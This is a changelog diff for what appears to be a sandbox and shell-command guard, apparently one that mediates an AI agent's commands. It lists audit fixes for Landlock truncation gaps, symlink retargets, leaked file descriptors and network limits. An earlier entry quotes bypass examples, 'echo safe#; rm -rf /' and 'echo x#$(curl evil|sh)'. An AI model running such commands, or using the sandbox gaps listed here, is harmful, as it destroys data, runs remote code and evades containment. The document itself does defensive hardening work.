@@ -2,6 +2,17 @@
 
 ## [Unreleased]
 
+### Security (OS sandbox audit 2026-08-13)
+
+* **Landlock truncation integrity:** Linux OS-enforced sessions now require Landlock ABI 3+; ABI 1/2 degrade or fail closed because they do not mediate `truncate(2)` and `open(O_TRUNC)`. Doctor reports the probed ABI and gap.
+* **Linux FUSE profile parity:** the protect-on bootstrap protocol now carries every parent launch grant class, including read-only and host-config paths, so child profile reconstruction and attestation hashes remain identical.
+* **Canonical host-config grants:** existing host-config and ancestor-instruction paths are canonicalized and revalidated, preventing symlink retargets into secret trees or outside approved roots.
+* **Live backend requirements:** `--require-backend strong-sandbox` now accepts a planned OS attach, while `landlock` specifically requires a Landlock plan; child attach failures still abort launch.
+* **Verified descriptor scrub:** sandbox child handshakes fail closed unless inherited-FD cleanup is verified after the fallback path.
+* **Honest network evidence:** macOS route-forced banners and audit posture now state that UDP/QUIC remains unrestricted.
+* **Trustworthy stress probes:** mediated stress tests use a trusted host fixture outside the workspace, retain a workspace-plant anti-spoof check, and assert `strong-mediated` evidence on deny probes.
+* **Pre-opened stdio residual:** credentials and platform docs now explain that inherited FDs 0/1/2 can retain access outside filesystem path grants.
+
 ### Security (P0 audit 2026-08-12)
 
 * **Shell comment truncation bypass (P0-1):** `#` is now treated as a comment only when it starts a word (POSIX), so `echo safe#; rm -rf /` no longer truncates evaluation to `echo safe`, and command substitutions glued after `#` (`echo x#$(curl evil|sh)`) are still extracted and evaluated. Segmentation also always evaluates the full original line when it yields a single candidate.
